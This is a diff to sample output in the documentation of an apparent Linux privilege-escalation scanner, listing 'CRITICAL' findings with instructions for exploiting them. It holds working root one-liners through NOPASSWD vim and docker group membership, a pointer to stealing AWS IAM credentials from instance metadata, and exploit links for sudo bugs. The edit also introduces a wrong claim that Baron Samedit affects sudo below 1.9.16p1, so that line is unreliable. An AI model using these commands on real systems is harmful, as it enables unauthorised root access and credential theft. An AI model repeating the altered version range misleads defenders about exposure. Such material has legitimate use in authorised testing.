@@ -181,10 +181,10 @@ HOW TO EXPLOIT:
 ```
 [!!! CRITICAL !!!] Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow
 
-[VULNERABLE] sudo < 1.9.5p2 vulnerable
+[VULNERABLE] sudo < 1.9.16p1 vulnerable
 
-[LEARN] Heap overflow exploit. Works on most distros.
-[LEARN] GitHub: https://github.com/blasty/CVE-2021-3156
+[LEARN] Exploit: https://www.exploit-db.com/exploits/52352
+
 ```
 
 ### Application Service Finding
@@ -214,7 +214,7 @@ HOW TO EXPLOIT:
 Found instant privilege escalation opportunities:
 
 [!!! CRITICAL !!!] NOPASSWD vim - Instant root: sudo vim -c ':!/bin/sh'
-[!!! CRITICAL !!!] Sudo vulnerable to CVE-2021-3156 (Baron Samedit)
+[!!! CRITICAL !!!] Sudo vulnerable to CVE-2025-32463 - Privilege escalation
 [!!! CRITICAL !!!] DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
 [!!! CRITICAL !!!] AWS METADATA ACCESSIBLE - Steal IAM credentials
 
